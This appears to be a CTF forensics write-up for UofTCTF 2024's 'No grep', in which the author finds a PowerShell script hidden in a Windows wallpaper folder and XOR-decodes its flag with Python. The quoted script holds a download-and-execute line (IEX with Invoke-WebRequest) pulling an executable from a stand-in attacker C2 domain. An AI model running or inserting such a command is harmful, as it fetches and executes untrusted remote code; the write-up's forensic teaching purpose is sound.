---
title: "No grep"
description: "Use the VM from Hourglass to find the 2nd flag on the system !"
pubDate: 2024-01-15
ctf: "UofTCTF 2024"
category: "forensics"
author: "sealldev"
section: "CTFs"
image: "images/24-uoftctf/icon.png"
---

Continuing on the VM from [Hourglass](/writeups/24-irisctf-hourglass), we can see a majority of logs have either been erased, uninteresting or I couldn't find them and I have a skill issue...

I check for Powershell History with the following command: `get-content C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and some entries come out, one line of particular interest.

`Set-Alias -Name UpdateSystem -Value "C:\Windows\Web\Wallpaper\Theme2\update.ps1"`

A PS1 file..? Inside the *wallpapers..?* If that doesn't scream malware I don't know what will...

Reading the PS1 file we are given the following data:

```ps1
$String_Key = 'W0wMadeitthisfar'

$NewValue = '$(' + (([int[]][char[]]$String | ForEach-Object { "[char]$($_)" }) -join '+') + ')'

$chars = 34, 95, 17, 57, 2, 16, 3, 18, 68, 16, 12, 54, 4, 82, 24, 45, 35, 0, 40, 63, 20, 10, 58, 25, 3, 65, 0, 20

$keyAscii = $String_Key.ToCharArray() | ForEach-Object { [int][char]$_ }

$resultArray = $chars -bxor $keyAscii

IEX (Invoke-WebRequest -Uri 'https://somec2attackerdomain.com/chrome.exe' -UseBasicParsing).Content
```

Looking at the data, the main aspect of interest is `$keyAscii` which uses an `XOR` with `$chars` and `$keyAscii`.

`$keyAscii` is just `$String_Key` split into hex characters. So we just have to XOR them against eachother.

I end up writing a simple Python script to do this a bit faster as Powershell was refusing to XOR.

```python
x="34 95 17 57 2 16 3 18 68 16 12 54 4 82 24 45 35 0 40 63 20 10 58 25 3 65 0 20".split(' ')
y="87 48 119 77 97 100 101 105 116 116 104 105 115 102 97 114".split(' ')

flag=""
c=0
for n in range(len(x)):
    if c > len(y)-1:
        c=0
    flag+=chr(int(x[n])^int(y[c]))
    c+=1
print(flag)
```

```
$ python3 xor.py
uoftctf{0dd_w4y_t0_run_pw5h}
```

Flag: `uoftctf{0dd_w4y_t0_run_pw5h}`

**Files:** [ctf_vm.zip](https://web.archive.org/web/20240115074036/https://storage.googleapis.com/hourglass-uoftctf/ctf_vm.zip)